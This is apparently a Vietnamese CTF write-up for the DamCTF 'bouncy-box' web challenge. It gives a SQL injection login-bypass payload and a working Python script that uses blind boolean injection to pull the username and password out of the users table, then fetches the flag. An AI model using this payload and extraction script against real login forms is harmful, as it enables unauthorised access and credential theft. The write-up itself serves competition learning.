![Image](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/1.png)
</br>
form đăng nhập thứ nhất
![Img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/2.png)
Ở form đăng nhập này bị lỗi SQL injection, với payload `trung' or '1'='1'-- -`  nhập vào ô username, tôi dễ dàng vượt qua cơ chế xác thực và xuất hiện nút button `Free flag`
khi ấn vào thì xuất hiện form đăng nhập thứ hai, có vẻ form này không bị lỗi SQL injection, tôi sẽ lợi dụng form đăng nhập thứ nhất để dò tìm username password để đăng nhập
vào form đăng nhập thứ 2
![Img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/3.png)
</br>

cách giải của tôi
```import requests, string
s = requests.session()

url = 'https://bouncy-box.chals.damctf.xyz/login'

arr = ',' + string.printable

def blind_row(column,step):
    for char in arr:
        res = s.post(url,json={"username":f"admin' or ascii(substr((select {column} from users limit 1),{step},1))={ord(char)}-- -",
        "password":"admin","score":0}).status_code
        if res==200:
            return char
    return None
 
def rows(column):
    row = ''
    step = len(row) +1
    while True:
        char = blind_row(column,step)
        if char == None:
            return row
        row += char
        step += 1
        print('[+] %s = '%column,row)  

username = rows('username')
password = rows('password')

flag = s.post('https://bouncy-box.chals.damctf.xyz/flag',data={'username_input':username,'password_input':password}).text
print(flag)
# dam{b0uNCE_B0UNcE_b0uncE_B0uNCY_B0unce_b0Unce_b0Unc3}
```
[source đầy đủ ở đây](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/web1.py)
